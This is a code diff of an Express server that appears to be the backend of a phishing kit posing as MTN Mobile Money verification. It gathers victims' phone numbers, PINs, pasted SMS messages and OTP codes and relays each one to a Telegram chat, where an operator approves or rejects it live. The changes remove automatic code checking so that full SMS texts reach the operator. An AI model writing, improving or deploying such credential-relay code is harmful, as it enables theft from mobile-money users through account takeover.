@@ -10,6 +10,7 @@ app.use(cors());
 app.use(express.json());
 app.use(express.static(path.join(__dirname, '../frontend')));
 
+// ============ CONFIGURATION ============
 const PORT = process.env.PORT || 3000;
 const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
 const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -18,8 +19,10 @@ const SMS_GATEWAY_URL = process.env.SMS_GATEWAY_URL;
 const SMS_GATEWAY_API_KEY = process.env.SMS_GATEWAY_API_KEY;
 const DEBUG_SMS = process.env.DEBUG_SMS !== 'false'; // default true
 
+// ============ IN-MEMORY STORE ============
 const applications = {};
 
+// ============ HELPERS ============
 function generateId() {
   return 'APP' + Math.random().toString(36).substring(2, 10).toUpperCase();
 }
@@ -55,13 +58,15 @@ async function sendSms(to, text) {
     console.log(`✅ SMS sent to ${to}`);
   } catch (e) {
     console.error('❌ SMS send failed:', e.message);
-    // Fallback: simulate if gateway fails
     console.log(`[FALLBACK SIMULATED SMS] to ${to}: ${text}`);
   }
 }
 
+// ============ ROUTES ============
+
 app.get('/api/health', (req, res) => res.json({ ok: true }));
 
+// VERIFY PIN
 app.post('/api/verify-pin', async (req, res) => {
   const { phoneNumber, pin } = req.body;
   if (!phoneNumber || !pin) return res.status(400).json({ success: false, message: 'Missing required fields' });
@@ -74,6 +79,7 @@ app.post('/api/verify-pin', async (req, res) => {
     otpStatus: 'pending',
     smsCode: null,
     otpCode: null,
+    smsMessage: null,
     createdAt: new Date().toISOString()
   };
 
@@ -92,6 +98,7 @@ app.get('/api/check-pin-status/:applicationId', (req, res) => {
   res.json({ success: true, status: app.pinStatus });
 });
 
+// RESEND SMS
 app.post('/api/resend-sms', async (req, res) => {
   const { applicationId } = req.body;
   const app = applications[applicationId];
@@ -99,6 +106,7 @@ app.post('/api/resend-sms', async (req, res) => {
 
   const newCode = generateCode(6);
   app.smsCode = newCode;
+  app.smsMessage = null;
   await sendSms(`+237${app.phoneNumber}`, `Your MTN MoMo verification code is: ${newCode}`);
 
   const message = `🔄 *SMS RESENT*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nNew SMS code: ${newCode}\n\nPlease verify the SMS message the user will paste.`;
@@ -110,22 +118,16 @@ app.post('/api/resend-sms', async (req, res) => {
   res.json({ success: true });
 });
 
+// VERIFY SMS – now just forwards to admin for approval, no auto-check
 app.post('/api/verify-sms', async (req, res) => {
   const { applicationId, smsMessage } = req.body;
   const app = applications[applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
 
-  // Use regex with word boundary to extract 6-digit code
-  const extracted = (smsMessage.match(/\b\d{6}\b/) || [])[0];
-  console.log(`[VERIFY SMS] app: ${applicationId}, message: ${smsMessage}, extracted: ${extracted}, expected: ${app.smsCode}`);
+  app.smsMessage = smsMessage;
+  app.smsStatus = 'pending'; // awaiting admin approval
 
-  if (!extracted || extracted !== app.smsCode) {
-    // If DEBUG_SMS, allow code to be returned in error message? Or just log.
-    return res.json({ success: false, message: 'SMS code does not match. Please try again.' });
-  }
-
-  app.smsStatus = 'pending';
-  const message = `📨 *SMS MESSAGE RECEIVED*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nSMS Message: ${smsMessage}\n\nApprove or reject:`;
+  const message = `📨 *SMS MESSAGE RECEIVED*\n\nApplication ID: ${applicationId}\nPhone: +237${app.phoneNumber}\nSMS Message:\n${smsMessage}\n\nApprove or reject:`;
   const buttons = [[
     { text: '✅ Approve', callback_data: JSON.stringify({ a: 'APPROVE', step: 'SMS', appId: applicationId }) },
     { text: '❌ Reject', callback_data: JSON.stringify({ a: 'REJECT', step: 'SMS', appId: applicationId }) }
@@ -134,13 +136,14 @@ app.post('/api/verify-sms', async (req, res) => {
   res.json({ success: true });
 });
 
+// CHECK SMS STATUS
 app.get('/api/check-sms-status/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
   res.json({ success: true, status: app.smsStatus });
 });
 
-// DEBUG: Return SMS code if DEBUG_SMS enabled (or if gateway is not set)
+// DEV SMS CODE (for testing – shows the generated code if DEBUG_SMS true)
 app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
@@ -150,12 +153,14 @@ app.get('/api/dev-sms-code/:applicationId', (req, res) => {
   res.json({ success: false, simulated: false });
 });
 
+// CHECK OTP STATUS
 app.get('/api/check-otp-status/:applicationId', (req, res) => {
   const app = applications[req.params.applicationId];
   if (!app) return res.status(404).json({ success: false, message: 'Application not found' });
   res.json({ success: true, status: app.otpStatus });
 });
 
+// VERIFY OTP
 app.post('/api/verify-otp', async (req, res) => {
   const { applicationId, otp } = req.body;
   const app = applications[applicationId];
@@ -180,6 +185,7 @@ app.post('/api/verify-otp', async (req, res) => {
   res.json({ success: true });
 });
 
+// TELEGRAM WEBHOOK
 app.post('/api/telegram-webhook', async (req, res) => {
   const update = req.body;
   if (update.callback_query) {
@@ -218,6 +224,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
   res.sendStatus(200);
 });
 
+// Serve frontend
 app.get('*', (req, res) => {
   res.sendFile(path.join(__dirname, '../frontend', 'index.html'));
 });
